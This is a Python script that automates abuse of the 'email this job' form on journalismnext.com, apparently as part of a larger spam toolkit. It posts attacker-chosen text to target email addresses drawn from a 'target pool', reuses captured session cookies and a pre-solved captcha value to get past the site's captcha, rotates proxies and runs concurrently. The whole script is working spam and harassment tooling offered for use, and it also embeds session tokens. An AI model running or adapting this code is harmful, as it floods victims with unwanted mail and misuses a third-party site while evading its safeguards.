from os.path import basename

import requests

import module

cookies = {
    'CFID': '262856',
    'CFTOKEN': '5238ef36b90af633-E109AF86-E2B3-22CB-BB0E3168C03E0DB8',
    'JSESSIONID': 'ACB17608BB32C5FDE61EC423E618FC4E.cfusion',
    'URLTOKEN': 'CFID%3D262856%26CFTOKEN%3D5238ef36b90af633%2DE109AF86%2DE2B3%2D22CB%2DBB0E3168C03E0DB8%26jsessionid%3DACB17608BB32C5FDE61EC423E618FC4E%2Ecfusion',
    'SESSIONID': 'ACB17608BB32C5FDE61EC423E618FC4E%2Ecfusion',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    # 'Cookie': 'CFID=262856; CFTOKEN=5238ef36b90af633-E109AF86-E2B3-22CB-BB0E3168C03E0DB8; JSESSIONID=ACB17608BB32C5FDE61EC423E618FC4E.cfusion; URLTOKEN=CFID%3D262856%26CFTOKEN%3D5238ef36b90af633%2DE109AF86%2DE2B3%2D22CB%2DBB0E3168C03E0DB8%26jsessionid%3DACB17608BB32C5FDE61EC423E618FC4E%2Ecfusion; SESSIONID=ACB17608BB32C5FDE61EC423E618FC4E%2Ecfusion',
    'Origin': 'https://www.journalismnext.com',
    'Referer': 'https://www.journalismnext.com/emailjob.cfm?jid=41333&requesttimeout=500',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

params = {
    'task': 'send',
}


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response | None:
        text = self.get_text(target=target)
        data = {
            'jid': '41333',
            'originalname': text,
            'fromemail': target,
            'sendtoemail': target,
            'note': text,
            'captchatextenc': '&$_<&[M,J\r\n',
            'captchatext': '284447',
        }
        response = requests.post('https://www.journalismnext.com/emailjob.cfm', params=params, cookies=cookies,
                                 headers=headers, data=data, proxies=self.get_proxies(), timeout=30)
        return response


def main():
    spam = ConcreteSpam(
        basename(__file__)[:-3], target_pool_name='pobcasn23'
    )
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
